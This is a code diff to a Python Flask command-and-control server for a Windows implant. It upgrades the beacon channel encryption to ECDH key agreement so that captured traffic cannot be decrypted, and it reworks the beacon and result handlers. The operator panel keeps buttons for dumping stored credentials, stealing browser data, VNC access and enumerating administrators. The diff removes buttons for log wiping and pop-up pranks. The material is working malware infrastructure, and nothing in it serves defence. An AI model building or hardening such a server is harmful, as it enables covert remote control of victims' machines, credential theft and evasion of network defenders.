@@ -35,31 +35,60 @@ except ImportError:
 
 try:
     from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    from cryptography.hazmat.primitives.asymmetric import ec
+    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
     _AESGCM_OK = True
 except ImportError:
     _AESGCM_OK = False
 
 
-# ── AES-256-GCM channel (implant ↔ server payload encryption) ─────────────────
-# Key = SHA256(sessionId) — both sides derive it independently. Wire format is
-# Base64( nonce[12] || tag[16] || ciphertext ), exactly what the implant's
-# BCrypt AesGcm helpers produce/consume.
-def _derive_key(sid: str) -> bytes:
-    return hashlib.sha256(sid.encode("utf-8")).digest()
+# ── Channel key agreement (ECDH P-256) + AES-256-GCM wire encryption ─────────
+# The implant generates a fresh ephemeral P-256 keypair per run and sends its
+# public point in the X-Pub-Key header (Base64 of big-endian X||Y). The server
+# holds one long-lived P-256 keypair (in memory, rotated on restart) and
+# answers with its own public point in the beacon response ("spk"). Both sides
+# derive the channel key as SHA-256(ECDH shared secret) — no key material ever
+# crosses the wire, and every implant run gets a fresh key. (Replaces the old
+# SHA256(sessionId) scheme, which anyone capturing a single beacon could
+# reproduce, since the session ID rode in plaintext.)
+# Wire format: Base64( nonce[12] || tag[16] || ciphertext ), matching the
+# implant's BCrypt AesGcm helpers.
+_SRV_ECDH = ec.generate_private_key(ec.SECP256R1()) if _AESGCM_OK else None
+_SRV_PUB_B64 = ""
+if _SRV_ECDH is not None:
+    _SRV_PUB_B64 = base64.b64encode(
+        _SRV_ECDH.public_key().public_bytes(
+            Encoding.X962, PublicFormat.UncompressedPoint)[1:]
+    ).decode()
 
-def _enc_blob(sid: str, obj: dict):
-    if not _AESGCM_OK:
+def _ecdh_key(impl_pub_b64: str) -> bytes | None:
+    """Channel key derived from the implant's X-Pub-Key header point."""
+    if not _AESGCM_OK or _SRV_ECDH is None or not impl_pub_b64:
+        return None
+    try:
+        xy = base64.b64decode(impl_pub_b64)
+        if len(xy) != 64:
+            return None
+        peer = ec.EllipticCurvePublicKey.from_encoded_point(
+            ec.SECP256R1(), b"\x04" + xy)
+        shared = _SRV_ECDH.exchange(ec.ECDH(), peer)
+        return hashlib.sha256(shared).digest()
+    except Exception:
+        return None
+
+def _enc_blob(key: bytes, obj: dict):
+    if not _AESGCM_OK or not key:
         return None
     nonce = os.urandom(12)
-    ct_tag = AESGCM(_derive_key(sid)).encrypt(nonce, json.dumps(obj).encode(), None)
+    ct_tag = AESGCM(key).encrypt(nonce, json.dumps(obj).encode(), None)
     wire = nonce + ct_tag[-16:] + ct_tag[:-16]   # nonce || tag || ct
     return base64.b64encode(wire).decode()
 
-def _dec_blob(sid: str, blob: str):
+def _dec_blob(key: bytes, blob: str):
     try:
         raw = base64.b64decode(blob)
         nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
-        pt = AESGCM(_derive_key(sid)).decrypt(nonce, ct + tag, None)
+        pt = AESGCM(key).decrypt(nonce, ct + tag, None)
         return json.loads(pt)
     except Exception:
         return None
@@ -170,20 +199,48 @@ def ping():
 @app.route("/beacon", methods=["POST"])
 @require_beacon
 def beacon():
+    raw     = request.get_data(as_text=True) or ""
+    enc_req = request.headers.get("X-Enc") == "1"
+    pub_hdr = request.headers.get("X-Pub-Key", "").strip()
+    sid_hdr = request.headers.get("X-Session-ID", "").strip()
+
     body = request.get_json(silent=True) or {}
     sid  = str(body.get("session", ""))[:128].strip()
+    derived = _ecdh_key(pub_hdr)
 
-    # Encrypted channel: body is Base64(nonce||tag||ct) keyed by SHA256(sid)
-    enc_req = request.headers.get("X-Enc") == "1"
+    channel_key: bytes | None = None
+
     if enc_req:
-        sid_hdr = request.headers.get("X-Session-ID", "").strip()
-        payload = _dec_blob(sid_hdr, request.get_data(as_text=True) or "")
+        if not sid_hdr:
+            return _err("Missing session header", 400)
+        sid = sid_hdr
+        with _lock:
+            stored_key = _sessions.get(sid, {}).get("key")
+        payload = None
+        # Stored key first, then a freshly derived one (covers a server
+        # restart that rotated the ECDH keypair).
+        for k in (stored_key, derived):
+            if k is None:
+                continue
+            payload = _dec_blob(k, raw)
+            if payload is not None:
+                channel_key = k
+                break
         if payload is None:
-            return _err("Bad encrypted payload", 400)
-        sid = str(payload.get("session", ""))[:128].strip()
-        if not sid or sid != sid_hdr:
+            # Key mismatch — answer unencrypted with a fresh spk so the
+            # implant re-handshakes on this same response.
+            _audit_log("beacon_rehandshake", {"sid": sid})
+            return _json_r({"cmd": "sleep", "spk": _SRV_PUB_B64})
+        p_sid = str(payload.get("session", ""))[:128].strip()
+        if not p_sid or p_sid != sid:
             return _err("Session mismatch", 401)
         body = payload
+    elif derived is not None:
+        # Plaintext bootstrap beacon — adopt the implant's fresh channel key.
+        channel_key = derived
+    else:
+        with _lock:
+            channel_key = _sessions.get(sid, {}).get("key")
 
     if not sid:
         return _err("Missing session", 400)
@@ -193,7 +250,7 @@ def beacon():
 
     cmd_out = "sleep"
     audit_action = "beacon"
-    audit_detail: dict = {"sid": sid}
+    audit_detail: dict = {"sid": sid, "enc": bool(channel_key)}
 
     with _lock:
         existing = _sessions.get(sid)
@@ -209,6 +266,7 @@ def beacon():
             "pending_tasks": len(_tasks.get(sid, [])),
             "result_count":  len(_results.get(sid, [])),
             "status":        status,
+            "key":           channel_key or (existing.get("key") if existing else None),
         }
 
         if status == "rejected":
@@ -227,27 +285,46 @@ def beacon():
 
     _audit_log(audit_action, audit_detail)
 
-    if enc_req and _AESGCM_OK:
-        blob = _enc_blob(sid, {"cmd": cmd_out})
+    if channel_key and _AESGCM_OK:
+        blob = _enc_blob(channel_key, {"cmd": cmd_out})
         if blob:
-            return _json_r({"e": 1, "cmd": blob})
-    return _json_r({"cmd": cmd_out})
+            return _json_r({"e": 1, "cmd": blob, "spk": _SRV_PUB_B64})
+    return _json_r({"cmd": cmd_out, "spk": _SRV_PUB_B64})
 
 # ── Result ────────────────────────────────────────────────────────────────────
 @app.route("/result", methods=["POST"])
 @require_beacon
 def result():
-    body   = request.get_json(silent=True) or {}
-    sid    = str(body.get("session", ""))[:128].strip()
-
+    raw     = request.get_data(as_text=True) or ""
     enc_req = request.headers.get("X-Enc") == "1"
+    pub_hdr = request.headers.get("X-Pub-Key", "").strip()
+    sid_hdr = request.headers.get("X-Session-ID", "").strip()
+
+    body = request.get_json(silent=True) or {}
+    sid  = str(body.get("session", ""))[:128].strip()
+    derived = _ecdh_key(pub_hdr)
+
     if enc_req:
-        sid_hdr = request.headers.get("X-Session-ID", "").strip()
-        payload = _dec_blob(sid_hdr, request.get_data(as_text=True) or "")
+        if not sid_hdr:
+            return _err("Missing session header", 400)
+        sid = sid_hdr
+        with _lock:
+            stored_key = _sessions.get(sid, {}).get("key")
+        payload = None
+        for k in (stored_key, derived):
+            if k is None:
+                continue
+            payload = _dec_blob(k, raw)
+            if payload is not None:
+                # Adopt a freshly derived key (covers a server restart).
+                if k is not stored_key and sid in _sessions:
+                    with _lock:
+                        _sessions[sid]["key"] = k
+                break
         if payload is None:
             return _err("Bad encrypted payload", 400)
-        sid = str(payload.get("session", ""))[:128].strip()
-        if not sid or sid != sid_hdr:
+        p_sid = str(payload.get("session", ""))[:128].strip()
+        if not p_sid or p_sid != sid:
             return _err("Session mismatch", 401)
         body = payload
 
@@ -1029,8 +1106,6 @@ header{height:58px;display:flex;align-items:center;gap:0;padding:0 14px;flex-shr
         <button class="qcmd" onclick="cmdInsert('!vnc ')">vnc</button>
         <button class="qcmd" onclick="cmdInsert('ps1 ')">ps1</button>
         <button class="qcmd" onclick="sendCmd('psreset')">psreset</button>
-        <button class="qcmd" onclick="cmdInsert('!prank ')">prank</button>
-        <button class="qcmd" onclick="sendCmd('!popups')">popups</button>
         <button class="qcmd" onclick="sendCmd('net user')">net user</button>
         <button class="qcmd" onclick="sendCmd('net localgroup administrators')">local admins</button>
         <button class="qcmd" onclick="sendCmd('!browser')">browsers</button>
@@ -1039,7 +1114,6 @@ header{height:58px;display:flex;align-items:center;gap:0;padding:0 14px;flex-shr
         <button class="qcmd" onclick="sendCmd('cmdkey /list')">creds</button>
         <button class="qcmd" onclick="sendCmd('!getpid')">getpid</button>
         <button class="qcmd" onclick="sendCmd('!env')">env</button>
-        <button class="qcmd danger" onclick="sendCmd('!wipe')">wipe logs</button>
       </div>
     </div>
   </div>
